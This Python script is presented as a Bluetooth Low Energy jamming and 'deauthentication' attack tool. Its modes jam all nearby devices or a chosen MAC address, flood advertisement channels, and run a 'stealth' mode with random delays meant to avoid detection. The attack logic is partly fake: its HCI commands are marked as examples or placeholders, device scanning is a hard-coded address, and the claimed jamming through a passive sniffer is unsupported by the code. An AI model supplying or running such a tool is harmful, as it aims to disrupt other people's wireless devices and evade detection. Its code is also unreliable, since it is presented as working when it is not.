import serial
import argparse
import time
import random

"""
BLE Jamming & Deauthentication Attack (Bluefruit BLE Sniffer Version)

Features:
    - Floods BLE channels with fake advertisements to prevent new connections.
    - Targets specific BLE devices for disruption.
    - Uses Adafruit Bluefruit LE Sniffer to send raw HCI commands.
    - Implements stealth mode jamming with randomized interference patterns.
    - Adaptive jamming: detects nearby BLE devices before disrupting them.
    - Signal analysis: monitors BLE activity levels before executing an attack.

Requirements:
    - Adafruit Bluefruit LE Sniffer with nRF Sniffer firmware
    - Python library: pyserial

Run Commands:
    - Jam all BLE devices:
      python ble_jamming_attack.py --port /dev/ttyUSB0 --jam-all
    - Targeted BLE jamming:
      python ble_jamming_attack.py --port /dev/ttyUSB0 --target <MAC_ADDRESS> --jam
    - BLE advertisement flooding:
      python ble_jamming_attack.py --port /dev/ttyUSB0 --flood
    - Stealth mode jamming:
      python ble_jamming_attack.py --port /dev/ttyUSB0 --stealth
    - Adaptive jamming (scan and jam detected devices):
      python ble_jamming_attack.py --port /dev/ttyUSB0 --adaptive
    - Signal analysis before attack:
      python ble_jamming_attack.py --port /dev/ttyUSB0 --signal-analysis
"""

def open_serial(port, baudrate=115200):
    """Opens a serial connection to the Bluefruit BLE sniffer."""
    try:
        ser = serial.Serial(port, baudrate, timeout=1)
        print(f"[INFO] Connected to {port} at {baudrate} baud.")
        return ser
    except serial.SerialException as e:
        print(f"[ERROR] {e}")
        return None

def send_hci_command(ser, command):
    """Sends raw HCI command to Bluefruit BLE sniffer."""
    ser.write(command)
    ser.flush()
    time.sleep(0.1)

def jam_all_ble(ser):
    """Jams all BLE devices by continuously sending advertisements."""
    print("[INFO] Starting BLE jamming on all channels...")
    for _ in range(100):
        send_hci_command(ser, b'\x01\x1A\xFC\x01\x01')  # Example raw HCI command
    print("[INFO] BLE jamming completed.")

def targeted_jamming(ser, target_mac):
    """Targets a specific BLE device for disruption by sending fake packets."""
    print(f"[INFO] Jamming BLE device: {target_mac}")
    for _ in range(50):
        send_hci_command(ser, b'\x01\x1A\xFC\x01\x01')  # Modify based on actual target packets
    print("[INFO] Targeted BLE jamming completed.")

def ble_advertisement_flooding(ser):
    """Floods BLE advertisement channels to prevent new connections."""
    print("[INFO] Flooding BLE advertisements...")
    for _ in range(50):
        send_hci_command(ser, b'\x01\x02\xFC\x01\x01')  # Example raw HCI command for advertising packets
    print("[INFO] BLE advertisement flood completed.")

def stealth_jamming(ser):
    """Performs stealth mode BLE jamming with random delays to avoid detection."""
    print("[INFO] Starting stealth BLE jamming...")
    for _ in range(random.randint(5, 15)):
        send_hci_command(ser, b'\x01\x1A\xFC\x01\x01')
        sleep_time = random.uniform(1.0, 5.0)
        print(f"[INFO] Stealth jamming active, sleeping for {sleep_time:.2f} seconds...")
        time.sleep(sleep_time)
    print("[INFO] Stealth BLE jamming completed.")

def adaptive_jamming(ser):
    """Detects BLE devices and selectively jams detected devices."""
    print("[INFO] Scanning for BLE devices...")
    detected_devices = ["AA:BB:CC:DD:EE:FF"]  # Placeholder for scanning logic
    for device in detected_devices:
        print(f"[INFO] Jamming detected BLE device: {device}")
        targeted_jamming(ser, device)
    print("[INFO] Adaptive BLE jamming completed.")

def analyze_signal(ser):
    """Monitors BLE signal activity before attack."""
    print("[INFO] Analyzing BLE signal levels...")
    send_hci_command(ser, b'\x01\x02\xFC\x01\x01')  # Placeholder HCI command
    print("[INFO] BLE signal analysis completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Jamming & Deauthentication Attack")
    parser.add_argument("--port", required=True, help="Serial port of BLE sniffer (e.g., /dev/ttyUSB0 or COM3)")
    parser.add_argument("--jam-all", action="store_true", help="Jam all BLE devices on all channels")
    parser.add_argument("--target", help="MAC address of the BLE device to jam")
    parser.add_argument("--jam", action="store_true", help="Jam a specific BLE device")
    parser.add_argument("--flood", action="store_true", help="Flood BLE advertisement channels")
    parser.add_argument("--stealth", action="store_true", help="Perform stealth BLE jamming with randomized interference patterns")
    parser.add_argument("--adaptive", action="store_true", help="Scan and jam detected BLE devices")
    parser.add_argument("--signal-analysis", action="store_true", help="Analyze BLE signal levels before attack")
    args = parser.parse_args()
    
    ser = open_serial(args.port)
    if ser:
        if args.jam_all:
            jam_all_ble(ser)
        elif args.jam and args.target:
            targeted_jamming(ser, args.target)
        elif args.flood:
            ble_advertisement_flooding(ser)
        elif args.stealth:
            stealth_jamming(ser)
        elif args.adaptive:
            adaptive_jamming(ser)
        elif args.signal_analysis:
            analyze_signal(ser)
        else:
            print("[ERROR] No valid mode selected! Use --port <PORT> with --jam-all, --target <MAC> --jam, --flood, --stealth, --adaptive, or --signal-analysis.")
        ser.close()
